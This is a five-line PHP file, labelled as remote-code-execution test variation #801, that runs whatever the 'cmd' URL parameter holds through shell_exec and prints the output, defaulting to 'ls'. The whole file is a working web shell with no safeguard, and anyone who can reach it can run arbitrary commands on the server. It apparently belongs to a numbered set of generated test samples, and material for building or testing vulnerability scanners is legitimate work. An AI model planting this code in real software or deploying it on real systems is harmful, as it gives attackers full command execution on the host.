<?php
// RCE test variation #801
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>